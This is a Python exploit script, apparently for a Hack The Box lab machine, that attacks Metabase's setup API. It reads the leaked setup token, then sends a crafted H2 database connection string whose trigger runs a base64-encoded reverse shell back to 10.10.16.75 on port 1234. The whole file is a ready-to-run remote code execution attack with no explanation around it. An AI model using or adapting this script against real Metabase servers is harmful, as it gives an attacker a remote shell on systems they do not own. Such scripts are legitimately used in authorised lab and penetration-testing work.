import requests as r
import time
import base64

encoded_command = base64.b64encode("bash -i >&/dev/tcp/10.10.16.75/1234 0>&1  ".encode()).decode()

url = "http://data.analytical.htb/api/session/properties"
response = r.get(url, verify=False)
jsoned = response.json()
print("Obtained token" + jsoned["setup-token"])

before = time.time()

url = "http://data.analytical.htb/api/setup/validate"
headers = {'Content-Type': 'application/json'}
payload = f"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{encoded_command}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x"
print(payload)
data = {
    "token": jsoned["setup-token"],
    "details": {
        "is_on_demand": False,
        "is_full_sync": False,
        "is_sample": False,
        "cache_ttl": None,
        "refingerprint": False,
        "auto_run_queries": True,
        "schedules": {},
        "details": {
            "db": payload,
            "advanced-options": False,
            "ssl": True
        },
        "name": "test",
        "engine": "h2"
    }
}
response = r.post(url, json=data, headers=headers, verify=False)
response = response.text
print(f"Elaped {str(time.time()-before)}")
print(response)